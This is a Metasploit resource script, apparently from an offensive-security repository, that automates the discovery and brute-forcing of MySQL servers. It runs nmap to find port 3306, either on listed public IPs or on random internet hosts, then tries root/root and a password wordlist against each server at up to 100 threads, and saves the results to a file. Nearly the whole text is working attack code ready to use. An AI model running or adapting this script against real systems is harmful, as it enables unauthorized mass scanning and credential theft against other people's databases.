   <ruby>
      run_single("workspace -a redteam")
      help = %Q|
        Description:
          setg SAVE_DB true - Save workspace redteam to database.xml
          setg LIMMIT 1000 - Limit the number of random rhosts to search
          setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 3306 open
          setg RHOSTS 212.8.247.171 213.171.197.190 - To instruct db_nmap to check targets for port 3306 open
          setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
          mysql_brute will use nmap to search/check for port 3306 open, then it populates the msfdb with
          a list of hosts found, and run auxiliary modules to gather info and brute force mysql services.
          if none value (setg) has povided then this resource script will use is own default values.

        Execute in msfconsole:
          setg SAVE_DB <true-or-blank>
          setg LIMMIT <number-of-rhosts>
          setg RANDOM_HOSTS <true-or-blank>
          setg RHOSTS <hosts-separated-by-spaces>
          setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
          resource <path-to-script>/mysql_brute.rc

        Author:
          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
      |
      print_line(help)
      Rex::sleep(2.0)
      print_line("")


      ## Make sure we are connected to db
      unless framework.db.active
        print_error("Database not connected to postgresql.")
        print_warning("[execute] service postgresql start")
        run_single("exit")
        return nil
      else
        print_good("Database connected to postgresql.")
        Rex::sleep(1.0)
      end

      ## Sellect the type of nmap scan to use
      if (framework.datastore['RANDOM_HOSTS'] == "true")
         if (framework.datastore['LIMMIT'] == nil or framework.datastore['LIMMIT'] == '')
           run_single("setg LIMMIT 800")
           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['LIMMIT']} -p 3306 --open --script=mysql-info.nse")
         else
           print_line("LIMMIT => #{framework.datastore['LIMMIT']}")
           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['LIMMIT']} -p 3306 --open --script=mysql-info.nse")
         end
      elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
         run_single("setg RHOSTS 192.168.1.0/24")
      elsif (framework.datastore['RHOSTS'])
         print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
      end

      ## Metasploit auxiliarys brute force dicionary absoluct path
      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
         run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
      end

      ## db_nmap WAN or RHOSTS scan settings
      unless (framework.datastore['RANDOM_HOSTS'] == "true")
         run_single("db_nmap -sV -Pn -T4 -O -p 3306 --script=mysql-info.nse --open #{framework.datastore['RHOSTS']}")
      else
         print_warning("db_nmap: search for random remote targets with port 3306 open (mysql)")
         run_single("db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['LIMMIT']} --script=mysql-info.nse -p 3306 --open")
      end

      ## Read current database and declare local vars
      run_single("spool mysql_brute.log")
      print_line("")
      run_single("services")
      print_good("Reading msfdb database for info.")
      xhost = framework.db.hosts.map(&:address).join(' ')
      xport = framework.db.services.map(&:port).join(' ')
      proto = framework.db.services.map(&:proto).join(' ')
      xname = framework.db.hosts.map(&:os_name).join(' ').gsub(' ',', ')

         ## Make sure that exists hosts/ports (open) in database
         if xhost.nil? or xhost == ''
              print_error("db_nmap scan did not find any alive connections.")
              print_error("Please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg all")
              File.delete('mysql_brute.log')
              run_single("workspace -d redteam")
              return nil
         elsif xport.nil? or xport == ''
              print_error("db_nmap did not find any 3306 open ports.")
              print_error("Please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              run_single("unsetg all")
              File.delete('mysql_brute.log')
              run_single("workspace -d redteam")
              return nil
         end

         print_status("Operative systems: #{xname}")
         run_single("setg RHOSTS #{xhost}")
         Rex::sleep(2.0)
         if xport =~ /3306/i or proto =~ /mysql/i
              print_warning("Remote Target port 3306 mysql found.")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mysql/mysql_version")
              run_single("set THREADS 20")
              print_line("")
              run_single("services -c name -S mysql -R")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/admin/mysql/mysql_enum")
              run_single("set USERNAME root")
              run_single("set PASSWORD root")
              run_single("set THREADS 20")
              print_line("")
              run_single("services -c name -S mysql -R")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/scanner/mysql/mysql_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 100")
              print_line("")
              run_single("services -c name -S mysql -R")
              run_single("exploit")
              Rex::sleep(1.5)
       end

      ## Save current database to local file (database.xml)
      if (framework.datastore['SAVE_DB'] == "true")
         rand = Rex::Text.rand_text_alpha(5)
         print_warning("Exporting database to: database_#{rand}.xml")
         run_single("db_export -f xml -a database_#{rand}.xml")
      end

      ## Cleaning database and unset global variables
      print_warning("Please wait, Cleaning global variables.")
      Rex::sleep(1.5)
      run_single("unsetg all")
      run_single("unset all")
      run_single("workspace -d redteam")
      run_single("back")

print_warning("Logfile stored under: mysql_brute.log")
print_warning("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
</ruby>
